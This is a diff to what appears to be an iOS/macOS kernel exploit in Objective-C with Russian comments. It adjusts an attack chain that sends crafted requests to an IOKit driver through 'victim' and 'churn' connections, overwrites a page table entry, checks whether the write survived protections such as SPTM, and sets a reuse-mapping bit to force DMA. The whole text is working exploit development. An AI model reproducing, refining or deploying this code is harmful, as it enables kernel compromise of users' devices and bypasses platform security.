@@ -6265,7 +6265,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint32_t *)(tsdZ + 0) = churnSrcID;
     *(uint32_t *)(tsdZ + 4) = churnDstID;
     *(uint64_t *)(tsdZ + 8) = 1;   // async
-    for (int i = 0; i < 800; i++)
+    for (int i = 0; i < 0; i++)   // 1.9.161: churn не нужен — подмена ДО submit (фаза 1), PTE патчится после execute #1 (фаза 2); 800 валидных опов держали очередь и victim#1 не успевал исполниться
         IOConnectCallMethod(churn, 1, NULL, 0, tsdZ, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
     // victim async с ОТКАЛИБРОВАННЫМ TSD (при execute сделает DMA)
     uint8_t tsdV[0x1B0];
@@ -6273,9 +6273,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     *(uint32_t *)(tsdV + 0) = srcID;
     *(uint32_t *)(tsdV + 4) = dstID;
     *(uint64_t *)(tsdV + 8) = 1;   // async
-    *(uint64_t *)(tsdV + 0x20) |= (1ULL << 43);   // 1.9.160 (р.36): reuse mapping — mapIOSurface пропускает re-map при [op+0xc04]==1
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
-    kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=800): kr=0x%x", avkr]);
+    kpNote(r, [NSString stringWithFormat:@"  victim async submit (backlog=0): kr=0x%x", avkr]);
     // 1.9.147: OP-ENTRY ОРАКУЛ — surfVA из самой оп-записи scheduler'а, без портов
     // и реестра. Submit (sel1) резолвит surface ptr в op-entry (раунд 24); нашу
     // запись находим по credit=0x10 (sel10 выше), сканируем 0x21c0 на указатели,
@@ -6649,7 +6648,12 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             kpNote(r, [NSString stringWithFormat:@"  [P2] readback PTE = %#018llx — %@",
                       (unsigned long long)rb, rb == newPTE ? @"ПРИЛИПЛО" : @"НЕ прилипло (SPTM?)"]);
             if (rb == newPTE) {
-                kern_return_t v2kr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+                // 1.9.161: bit43 (reuse mapping) — только на victim #2: #1 маппит
+                // свежим (bit43=0), иначе при отсутствии кэша DMA вообще нет
+                uint8_t tsdV2[0x1B0];
+                memcpy(tsdV2, tsdV, sizeof(tsdV2));
+                *(uint64_t *)(tsdV2 + 0x20) |= (1ULL << 43);
+                kern_return_t v2kr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV2, sizeof(tsdV2), NULL, NULL, NULL, NULL);
                 kpNote(r, [NSString stringWithFormat:@"  [P2] victim #2 submit (reuse mapping): kr=0x%x — жду DMA в ctl", v2kr]);
                 usleep(300000);
                 int changed2 = 0;
